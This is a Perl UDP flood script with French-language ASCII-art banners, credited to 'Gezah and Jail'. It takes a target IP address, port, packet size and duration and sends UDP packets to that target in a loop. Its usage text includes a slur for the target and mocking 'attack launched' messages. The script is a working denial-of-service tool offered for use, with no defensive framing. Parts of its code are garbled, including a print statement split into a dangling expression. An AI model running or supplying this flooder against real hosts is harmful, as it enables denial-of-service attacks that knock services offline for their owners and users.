##############
# udp flood.
##############

use Socket;
use strict;
 
print <<EOTEXT;

         _______________________________
       |  ____________________________  |
       | | __________________________ | |
       | || >root                    || |
       | || login	             || |
       | || password		     || |
       | || ..................       || |
       | ||                          || |
       | || Gezah and Jail           || |
       | ||__________________________|| |
       | |____________________________| |
       |________________________________|
       ||    _____________________     ||
       ||    |a|z|e|r|t|y|u|i|o|p|     ||
       ||    |q|s|d|f|g|h|j|k|l|m|     || 
       ||         |w|x|c|v|b|n|        ||
       ||__________ |_______| _________||
       |________________________________|
Script By Gezah and Jail
Commande: Script.pl <ip> <port> <packets> <temps>
IP : celle du pd , port : 80 ou 0 , packets : 65500 , temps : comme tu veux


EOTEXT

my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Entre IP Valide$ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;         
     
	________________________________
       |  ____________________________  |
       | | __________________________ | |
       | || >root                    || |
       | || Attaque Lancée    	     || |
       | || AHAHAH                   || |
       | || ..................       || |
       | ||                          || |
       | || Gezah and Jail           || |
       | ||__________________________|| |
       | |____________________________| |
       |________________________________|
       ||    _____________________     ||
       ||    |a|z|e|r|t|y|u|i|o|p|     ||
       ||    |q|s|d|f|g|h|j|k|l|m|     || 
       ||         |w|x|c|v|b|n|        ||
       ||__________ |_______| _________||
       |________________________________|\n";

	Gezah and Jail

EOTEXT

print"Tu es entrin de Down Cet IP $ip avec le port " . ($port ? $port : "random") . ", envoit de "; 

print "Designed By Jail and Coded By Gezah\n";

  ($size ? "$size-byte" : "random size") . " packets" . 
  ($time ? " pour $time secondes" : "") . "\n";
print "Stop l'attaque avec Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
